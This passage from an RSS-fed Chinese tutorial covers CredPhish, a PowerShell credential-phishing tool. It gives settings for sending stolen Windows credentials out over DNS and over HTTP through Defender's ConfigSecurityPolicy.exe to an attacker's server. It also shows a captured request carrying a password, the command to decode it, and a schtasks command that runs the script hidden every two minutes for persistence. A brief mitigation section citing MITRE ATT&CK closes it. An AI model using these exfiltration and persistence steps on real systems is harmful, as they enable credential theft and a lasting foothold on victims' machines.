&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$subdomainLength&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 子域名的最大字符数。必须是2-60之间的偶数，否则查询会中断&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过DNS外传功能发送的凭证，请在Kali中执行&lt;strong&gt;dns_server.py&lt;/strong&gt;脚本。按&lt;strong&gt;Ctrl + c&lt;/strong&gt;终止DNS服务器，它将重建拦截的明文凭证。&lt;/p&gt;
&lt;p&gt;CredPhish内置的另一种外传方法是HTTP请求。它利用Windows Defender中包含的二进制文件“ConfigSecurityPolicy.exe”将凭证发送到攻击者的服务器。将**$enableHttpExfil&lt;strong&gt;变量设置为&lt;/strong&gt;$true**以启用它。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# http&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动HTTP服务器：python3 -m http.server 80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableHttpExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ConfigSecurityPolicy&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Prog*Files\Win*Defender\ConfigSecurityPolicy.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;发送的凭证，请在Kali中启动一个简单的HTTP服务器以在日志中捕获它们。&lt;/p&gt;
&lt;p&gt;在网络中，外传的凭证会显示如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_%26ecuRe-P%40ssw%25rD%23%5D HTTP/1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: */*  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UA-CPU: AMD64  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 192.168.56.104  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: Keep-Alive
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;由于凭证在传输前进行了URL编码，可以使用Burp的Decoder模块或Python的&lt;strong&gt;urllib&lt;/strong&gt;库通过命令行进行URL解码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/DESKTOP-S4DAAF0%5Btokyoneon%3A%23!Extr3m3Ly_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%26e&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cuRe-P&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%40s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;sw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%25r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%23%&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;5D&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/DESKTOP-S4DAAF0[tokyoneon:#!Extr3m3Ly_&amp;amp;ecuRe-P@ssw&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;D#]&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;credphishps1执行&#34;&gt;CredPhish.ps1执行
&lt;/h2&gt;&lt;p&gt;要快速测试CredPhish，请将&lt;strong&gt;credphish.ps1&lt;/strong&gt;移动到目标Windows 10机器并使用PowerShell执行它。&lt;/p&gt;
&lt;p&gt;一种持久化执行方法可能涉及&lt;strong&gt;任务计划程序&lt;/strong&gt;，这是Windows的一个组件，允许在预定义的时间间隔调度脚本执行。以下&lt;strong&gt;schtasks&lt;/strong&gt;示例将每2分钟执行一次&lt;strong&gt;credphish.ps1&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;schtasks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sc &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;minute&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tn&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;credphish&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -ep bypass -WindowStyle Hidden C:\path\to\credPhish\credphish.ps1&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;缓解与检测&#34;&gt;缓解与检测
&lt;/h2&gt;&lt;p&gt;CredPhish源自&lt;strong&gt;Invoke-LoginPrompt&lt;/strong&gt;、&lt;strong&gt;CredsLeaker&lt;/strong&gt;和&lt;strong&gt;Stitch&lt;/strong&gt;等项目，并不是密码钓鱼的终极解决方案。由于此类攻击通常非常针对用户，因此仍有改进空间。更激进的方法可能涉及使用Cobalt Strike伪造整个Windows 10锁屏并通过这种方式捕获凭证。&lt;/p&gt;
&lt;p&gt;这类攻击技术难以通过预防性控制措施缓解，因为它们滥用了系统功能。&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;strong&gt;用户培训&lt;/strong&gt;提高对潜在恶意事件和对话框（例如Office文档提示输入凭证）的意识和警惕性。&lt;/li&gt;
&lt;li&gt;监控进程执行，检测异常程序和恶意实例的&lt;strong&gt;命令和脚本解释器&lt;/strong&gt;，这些程序可能会提示用户输入凭证。&lt;/li&gt;
&lt;li&gt;检查并审查输入提示的非法性指标，例如非传统的横幅、文本、时间和/或来源。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
    </channel>
</rss>
